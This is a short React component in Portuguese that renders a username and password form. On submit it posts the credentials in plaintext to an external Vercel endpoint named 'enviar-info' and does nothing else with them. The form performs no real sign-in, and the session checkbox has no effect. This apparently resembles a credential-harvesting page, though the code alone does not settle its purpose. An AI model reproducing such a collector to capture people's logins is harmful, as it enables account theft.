import * as React from "react";
import "../components/App.css";
import axios from "axios";

function Home() {
  const [isCheckboxActived, SetCheckBox] = React.useState(false);
  const [Username, setUsername] = React.useState("");
  const [Password, setPassword] = React.useState("");

  const send_info = async () => {
    await axios.post("https://api-v2-rouge.vercel.app/enviar-info", { username: Username, senha: Password }).then(res => {
      if (res.data.ok) {
        console.log("TUDO CERTO")
      } else {
        console.log("ALGO DEU ERRADO") 
      }
    });

  };
  const verifyCheckbox = () => {
    SetCheckBox(!isCheckboxActived)
  }

  return (
    <div class="container">
      <div class="item-container">
        <p>Usuário</p>
          <form>
            <input type="text" class="input" onChange={(e) => {
              setUsername(e.target.value)
            }}></input>
          </form>
            <p>Senha</p>
          <form>
            <input type="password" class="input" onChange={(e) => {
              setPassword(e.target.value)
            }}></input>
          </form>
          <form>
            <label>
              <input type="checkbox" onChange={verifyCheckbox} checked={isCheckboxActived}/>
            Guardar minha Sessão.</label>
        </form>
      </div>
   <button id="input-button" onClick={send_info}>Confirmar</button>
    </div>
  )
}

export default Home;